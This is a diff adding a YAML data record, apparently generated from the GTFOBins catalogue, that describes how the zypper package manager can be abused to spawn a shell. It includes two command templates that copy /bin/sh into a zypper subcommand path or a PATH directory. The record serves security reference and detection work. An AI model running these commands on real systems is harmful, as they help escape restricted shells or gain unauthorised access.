@@ -1,0 +1,83 @@
+id: gtfobins/zypper/shell/unprivileged
+type: binary
+platform: linux
+name: zypper
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'cp /bin/sh /usr/lib/zypper/commands/zypper-x
+
+    zypper x'
+  comment: The copy usually requires elevated privileges.
+- template: 'cp /bin/sh /path/to/temp-dir/zypper-x
+
+    PATH=$PATH:/path/to/temp-dir/ zypper x'
+references:
+- https://gtfobins.github.io/gtfobins/zypper/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        zypper:
+          functions:
+            shell:
+            - code: 'cp /bin/sh /usr/lib/zypper/commands/zypper-x
+
+                zypper x'
+              comment: The copy usually requires elevated privileges.
+              contexts:
+                sudo: null
+                unprivileged: null
+            - code: 'cp /bin/sh /path/to/temp-dir/zypper-x
+
+                PATH=$PATH:/path/to/temp-dir/ zypper x'
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/zypper/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:10df840bcf3b28d76a75583fcb453977b73f4017daa518daab799a1afc174cd5
